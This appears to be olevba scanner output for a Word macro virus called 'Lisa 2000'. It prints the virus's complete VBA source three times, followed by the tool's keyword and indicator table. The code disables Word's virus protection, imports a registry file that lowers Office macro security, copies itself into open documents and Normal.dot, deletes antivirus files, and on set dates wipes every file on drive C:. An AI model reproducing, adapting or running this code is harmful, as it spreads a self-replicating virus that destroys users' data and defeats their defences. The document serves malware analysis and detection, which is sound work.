olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








































































































































































































Private Sub Document_Close()
'Lisa 2000'
'___Íĺ ďîęŕçűâŕňü âîçíčęŕţůčĺ îřčáęč___'
 On Error Resume Next
'___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 97___'
 Application.Options.VirusProtection = False
 
 '___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 2000, ŕ çŕîäíî č äë˙ ýęńĺë˙___'
            Set sm = CreateObject("Scripting.FileSystemObject")
            Set Ate = sm.CreateTextFile("c:\1.reg", True)
            Ate.WriteLine ("REGEDIT4")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.Close
            MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
            newHour = Hour(Now())
            newMinute = Minute(Now())
            newSecond = Second(Now()) + 5
            waitTime = TimeSerial(newHour, newMinute, newSecond)
            Kill ("c:\1.reg")

'___Çŕđŕćĺíčĺ îňęđűňűő äîęóěĺíňîâ___'
    s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Documents.Count
      t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
     If t = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
     End If
    Next k
 
 '___Çŕđŕćĺíčĺ Normal.dot (Ŕâňîçŕăđóçęŕ)___'
    t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
    If t = 0 Then
      Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
    End If
    
 '___Ďđîâĺđęŕ "Ńâîé"-"×óćîé"___'
     Set ms = Application.FileSearch
     Set gato = Application.FileSearch
     With ms
        .LookIn = "c:\windows\system\"
        .FileName = "lisa.dll"
     
     If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
    
 '___Ĺńëč ńâîé, íŕ âűőîä___'
       GoTo 80
       
 '___Ĺńëč ÷óćîé, âđĺäčňü____'
       Else
 
 '___Îáëîěŕňü AVP___'
      Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")
      
 '___Äĺíü ŔĐĚŔĂĹÄÎÍŔ___'
     If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
     With gato
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     End If
    
    End If
    End With
    
80:
End Sub

Private Sub Document_New()
'Lisa 2000'
'___Íĺ ďîęŕçűâŕňü âîçíčęŕţůčĺ îřčáęč___'
 On Error Resume Next
'___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 97___'
 Application.Options.VirusProtection = False
 
 '___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 2000, ŕ çŕîäíî č äë˙ ýęńĺë˙___'
            Set sm = CreateObject("Scripting.FileSystemObject")
            Set Ate = sm.CreateTextFile("c:\1.reg", True)
            Ate.WriteLine ("REGEDIT4")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.Close
            MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
            newHour = Hour(Now())
            newMinute = Minute(Now())
            newSecond = Second(Now()) + 5
            waitTime = TimeSerial(newHour, newMinute, newSecond)
            Kill ("c:\1.reg")

'___Çŕđŕćĺíčĺ îňęđűňűő äîęóěĺíňîâ___'
    s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Documents.Count
      t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
     If t = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
     End If
    Next k
 
 '___Çŕđŕćĺíčĺ Normal.dot (Ŕâňîçŕăđóçęŕ)___'
    t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
    If t = 0 Then
      Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
    End If
    
 '___Ďđîâĺđęŕ "Ńâîé"-"×óćîé"___'
     Set ms = Application.FileSearch
     Set gato = Application.FileSearch
     With ms
        .LookIn = "c:\windows\system\"
        .FileName = "lisa.dll"
     
     If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
    
 '___Ĺńëč ńâîé, íŕ âűőîä___'
       GoTo 90
       
 '___Ĺńëč ÷óćîé, âđĺäčňü____'
       Else
 
 '___Îáëîěŕňü AVP___'
      Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")
      
 '___Äĺíü ŔĐĚŔĂĹÄÎÍŔ___'
     If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
     With gato
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     End If
    
    End If
    End With
    
90:
End Sub

Private Sub Document_Open()
'Lisa 2000'
'___Íĺ ďîęŕçűâŕňü âîçíčęŕţůčĺ îřčáęč___'
 On Error Resume Next
'___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 97___'
 Application.Options.VirusProtection = False
 
 '___Îňęëţ÷ĺíčĺ çŕůčňű îň âčđóńîâ äë˙ âîđäŕ 2000, ŕ çŕîäíî č äë˙ ýęńĺë˙___'
            Set sm = CreateObject("Scripting.FileSystemObject")
            Set Ate = sm.CreateTextFile("c:\1.reg", True)
            Ate.WriteLine ("REGEDIT4")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.Close
            MyAppID = Shell("regedit.exe /s c:\1.reg", 0)
            newHour = Hour(Now())
            newMinute = Minute(Now())
            newSecond = Second(Now()) + 5
            waitTime = TimeSerial(newHour, newMinute, newSecond)
            Kill ("c:\1.reg")

'___Çŕđŕćĺíčĺ îňęđűňűő äîęóěĺíňîâ___'
    s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Documents.Count
      t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
     If t = 0 Then
      Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
     End If
    Next k
 
 '___Çŕđŕćĺíčĺ Normal.dot (Ŕâňîçŕăđóçęŕ)___'
    t = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines
    If t = 0 Then
      Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
    End If
    
 '___Ďđîâĺđęŕ "Ńâîé"-"×óćîé"___'
     Set ms = Application.FileSearch
     Set gato = Application.FileSearch
     With ms
        .LookIn = "c:\windows\system\"
        .FileName = "lisa.dll"
     
     If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
    
 '___Ĺńëč ńâîé, íŕ âűőîä___'
       GoTo 100
       
 '___Ĺńëč ÷óćîé, âđĺäčňü____'
       Else
 
 '___Îáëîěŕňü AVP___'
      Kill ("c:\Program Files\AntiViral Toolkit Pro\*.avc")
      
 '___Äĺíü ŔĐĚŔĂĹÄÎÍŔ___'
     If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 1) Then
     With gato
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     With gato
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
     End With
     End If
    
    End If
    End With
    
100:
            
End Sub
















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |1.reg               |Executable file name                         |
|IOC       |regedit.exe         |Executable file name                         |
|IOC       |lisa.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

